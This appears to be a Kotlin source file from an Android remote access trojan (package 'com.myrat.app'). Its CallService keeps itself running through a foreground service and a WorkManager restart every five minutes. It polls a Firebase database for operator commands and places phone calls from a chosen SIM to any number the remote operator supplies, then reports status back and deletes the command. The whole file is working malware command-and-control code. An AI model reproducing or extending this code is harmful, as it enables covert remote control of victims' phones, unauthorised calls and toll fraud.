package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.LauncherActivity
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger
import com.myrat.app.worker.CallServiceRestartWorker
import java.util.concurrent.TimeUnit

class CallService : Service() {
    companion object {
        private const val CHANNEL_ID = "CallServiceChannel"
        private const val NOTIFICATION_ID = 8
    }

    private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
    private lateinit var deviceId: String

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            deviceId = MainActivity.getDeviceId(this)
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(NOTIFICATION_ID, notification)
            scheduleRestart(this)
            Logger.log("CallService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to initialize CallService", e)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, stopping CallService")
                stopSelf()
                return START_NOT_STICKY
            }
            listenForCallCommands(deviceId)
            return START_STICKY
        } catch (e: Exception) {
            Logger.error("Failed to start CallService", e)
            return START_NOT_STICKY
        }
    }

    private fun scheduleRestart(context: Context) {
        try {
            val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                repeatInterval = 5, TimeUnit.MINUTES,
                flexTimeInterval = 1, TimeUnit.MINUTES
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "CallServiceRestart",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            Logger.log("Scheduled CallService restart using WorkManager")
        } catch (e: Exception) {
            Logger.error("Failed to schedule CallService restart", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Call Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Running phone call service"
                }
                val notificationManager = getSystemService(NotificationManager::class.java)
                notificationManager.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create call notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Monitoring call commands")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build call notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Running in background")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            capabilities != null && (
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                    )
        } catch (e: Exception) {
            Logger.error("Error checking network availability", e)
            false
        }
    }

    private fun listenForCallCommands(deviceId: String) {
        if (!isNetworkAvailable()) {
            Logger.error("No network available, cannot listen for call commands")
            stopSelf()
            return
        }

        try {
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("call_commands")

            commandsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: run {
                                Logger.error("Invalid command data for ${commandSnapshot.key}")
                                return@forEach
                            }
                            val status = command["status"] as? String
                            val simNumber = command["sim_number"] as? String
                            val recipient = command["recipient"] as? String
                            val commandId = commandSnapshot.key ?: return@forEach

                            if (status != "pending") {
                                Logger.log("Skipping command $commandId with status $status")
                                return@forEach
                            }
                            if (simNumber.isNullOrBlank() || recipient.isNullOrBlank()) {
                                Logger.error("Invalid call command data for command $commandId: sim_number=$simNumber, recipient=$recipient")
                                updateCommandStatus(commandId, "failed", "Invalid sim_number or recipient")
                                return@forEach
                            }
                            Logger.log("Processing call command: $commandId from $simNumber to $recipient")
                            initiateCall(simNumber, recipient, commandId)
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing call commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Call commands database error: ${error.message}", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to listen for call commands", e)
        }
    }

    private fun initiateCall(simNumber: String, recipient: String, commandId: String) {
        try {
            val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
            if (alreadySentSet.contains(recipient)) {
                Logger.log("Skipping duplicate call to $recipient for command $commandId")
                return
            }

            // Check permissions
            val hasCallPhonePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.CALL_PHONE
            ) == PackageManager.PERMISSION_GRANTED
            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                Logger.error("Missing permissions: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                updateCommandStatus(commandId, "failed", "Missing required permissions")
                return
            }

            // Check if device is locked
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            if (keyguardManager.isKeyguardLocked) {
                Logger.error("Cannot initiate call: Device is locked")
                updateCommandStatus(commandId, "failed", "Device is locked")
                showUnlockNotification()
                return
            }

            // Map simNumber to subscriptionId
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
            if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                Logger.error("No active SIM subscriptions found")
                updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
                return
            }

            // Find the correct subscription
            val subscriptionInfo = subscriptionInfoList.find { info ->
                info.number == simNumber || "sim${info.simSlotIndex + 1}" == simNumber.lowercase()
            }

            if (subscriptionInfo == null) {
                Logger.error("No SIM found for simNumber: $simNumber")
                updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
                return
            }

            val subId = subscriptionInfo.subscriptionId
            val simSlotIndex = subscriptionInfo.simSlotIndex
            Logger.log("Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")

            val intent = Intent(this, LauncherActivity::class.java).apply {
                action = "com.myrat.app.ACTION_MAKE_CALL"
                putExtra("recipient", recipient)
                putExtra("subId", subId)
                putExtra("simSlotIndex", simSlotIndex)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

            try {
                startActivity(intent)
                Logger.log("Initiated call from $simNumber (subId: $subId) to $recipient via LauncherActivity")
                alreadySentSet.add(recipient)
                updateCommandStatus(commandId, "success", null)
            } catch (e: ActivityNotFoundException) {
                Logger.error("Activity not found for call to $recipient", e)
                updateCommandStatus(commandId, "failed", "Activity not found")
            }
        } catch (e: SecurityException) {
            Logger.error("Permission denied for call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Logger.error("Failed to initiate call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
        }
    }

    private fun showUnlockNotification() {
        try {
            val channelId = "CallServiceAlerts"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    channelId,
                    "Call Service Alerts",
                    NotificationManager.IMPORTANCE_HIGH
                )
                val manager = getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Action Required")
                .setContentText("Please unlock your device to make a call.")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build()

            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(9, notification)
        } catch (e: Exception) {
            Logger.error("Failed to show unlock notification", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
            val updates = mutableMapOf<String, Any?>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }
            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated call command $commandId to status $status")
                    if (status == "success" || status == "failed") {
                        commandRef.removeValue()
                            .addOnSuccessListener {
                                Logger.log("Removed call command $commandId")
                                sentCallTracker.remove(commandId)
                            }
                            .addOnFailureListener { e ->
                                Logger.error("Failed to remove command: ${e.message}", e)
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update call command $commandId: ${e.message}", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating call command status", e)
        }
    }
}